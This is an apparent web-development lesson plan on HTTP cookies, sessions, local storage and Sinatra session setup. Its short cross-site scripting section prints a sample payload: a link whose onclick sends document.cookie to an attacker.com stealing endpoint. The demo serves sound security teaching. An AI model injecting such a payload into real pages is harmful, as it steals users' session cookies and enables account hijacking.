---
title: Cookies & Sessions
duration: "1:25"
creator:
    name: Mike Dang
    city: Austin
---

# ![](https://ga-dash.s3.amazonaws.com/production/assets/logo-9f88ae6c9c3871690e33280fcf557f33.png) Cookies & Sessions

### LEARNING OBJECTIVES
*After this lesson, you will be able to:*
* Describe how HTTP cookies work
* List common uses and limitations of cookies
* Explain why the statelessness of HTTP necessitates sessions & cookies
* Describe how sessions work
* Describe where a session exists in a client/server interaction
* Demonstrate how cookies are sent back and forth between client and server
* Explain the difference between session data, cookie data, and local storage
* Enable sessions within a Sinatra application to save state

### LESSON COMPONENTS

- Introduction
- Guided Practice
- Independent Practice

---

## Review

What is a protocol?

What does it mean when we say HTTP is a stateless protocol?

What methods did we learn so far for passing data to an application? What limitations are there to this approach? (Data is only passed for that request, it's lost after the request/response cycle)

## Cookie Cookie

Cookies are small pieces of data (4kb) sent from a website and stored in a user's computer by the browser. Although cookie data is generally sent from websites, it's also possible to use a client side language like JavaScript to set and retrieve cookie data.

They are sent with each request to web servers to give state for otherwise stateless HTTP transactions. Cookie data is stored as key/value pairs and you can access the data by the name.

Cookies were developed at Netscape as a way of persisting data between requests.

> The word 'cookie' comes from 'magic cookie,' a term in programming languages for a piece of information shared between co-operating pieces of software. The choice of the word cookie appears to come from the American tradition of giving and sharing edible cookies.

#### Types

* Session
  - No expiration timestamp, lives only for the duration of the browser session
* Persistent
  - Expiration date attached, information persists across sessions and is sent to servers with every request
* Third party tracking
  - Belong to domains not visible in the browser URL bar
  - Advertisers can place cookies on your machine to track where you've been and track your history
* HttpOnly
  - Used by sites to set cookies that can't be read by client side scripts. For example, Sinatra sets HttpOnly cookies for session data, that way client side scripts can't access it

#### Uses
* Session management
  - Unique session identifier within the persistent cookie that is sent with each request to the server
* Personalization
* User tracking
  - Advertisers use cookies to track users across multiple sites
  - This is why we might see custom/personalized ads when we visit Facebook or other sites

#### Setting and retrieving cookies

##### Server

- On the server, cookies are set with the ``` Set-Cookie ``` header in the response.
- The expires time is set with the ``` Expires ``` attribute with the date/time that the cookie should expire.
- The ``` Max-Age ``` sets the number of seconds the cookie is allowed to live since the time it was received.

##### Client

```js
// Set a cookie name/value
document.cookie = "username=John Doe";
```

```js
// Retrieving the cookie value
var cookie = document.cookie;
```

## Stop and Think

What are some limitations of cookies? Concerns?
- Live on the client side, users can tamper with
- Cookies eventually expire
- They are specific to the machine that the user browsed the site with (e.g. shopping cart contents would be tied to that machine). What happens when they switch devices or their computer dies?

### Sessions

When cookies were first used, they were used to store things like shopping cart items, etc but today they are stored in sessions.

We only want to store sensitive data on our side so that we can trust it's validity. We want that data available to that user no matter what device they might be browsing on.

#### How sessions work

Using persistent cookies, we're able to store a session identifier for that user that associates any number of data attributes to that particular user on the server (e.g. shopping cart items, user name, user role, admin privileges, etc)

## Sinatra Review

- Routes and how they correlate to HTTP verbs
- Role of the public folder
- Role of the views folder and .erb files
- Bundler and gems
  - Bundler allows us to maintain consistent environments for Ruby projects by tracking and installing the exact gems and versions needed
  - Run ``` bundle install ``` in the root to install everything in the Gemfile
- Parameters

### Sessions in Sinatra

Storing all session data within an encrypted cookie, persists across servers even after a restart

```ruby
# app.rb
require 'sinatra'

enable :sessions

get '/welcome' do
  name = session[:name]
  "Hello, #{name}!"
end

get '/:name' do
  session[:name] = params[:name]
  redirect '/welcome'
end
```

Storing session data on the server, faster and more secure but if the server goes down or restarts you lose session data

> Warning! You must restart Sinatra when changing the session method, reloader is not enough to have it working

```ruby
# app.rb
require 'sinatra'

use Rack::Session::Pool

get '/welcome' do
  name = session[:name]
  "Hello, #{name}!"
end

get '/:name' do
  session[:name] = params[:name]
  redirect '/welcome'
end
```

## Turn & Talk

**5 min**

Have students pair up with a partner and compare/contrast cookies and local storage. They will probably have to do some research especially in regards to local storage.

When would it be appropriate to use either one? What about sessions?

### Sessions vs Cookies vs Local Storage

##### Sessions
  - Can only be read on the server
  - Store secure data that you want to ensure hasn't been tampered with

##### Cookies
  - Can be read by both the client and server
  - Limited in size: 4 kb
  - Can set expiry time
  - Sent with every request to the server in the headers

##### Local Storage
  - HTML5, newer technology. Need to check requirements
  - Up to 5 mb storage per domain
  - Can ONLY be read by the client
  - Data persists forever, must be cleared manually by JavaScript or clearing browser history

### Cross-site Scripting

> This demo needs to be run from 127.0.0.1 (not 'localhost') on Chrome for it to work, in Safari we can just open up the file directly and it will work

If a website is not filtering user generated content, then a malicious user could output html/javascript that grabs any sensitive cookie data (e.g. session id) and send it to another malicoius website to steal it

```html
<a href="#" onclick="window.location='http://attacker.com/stole.cgi?text='+escape(document.cookie); return false;">Click here!</a>
```

## Class Exercise

**We Do**

Update your class repository and look at the starter code. We're going to build a mini shopping cart.
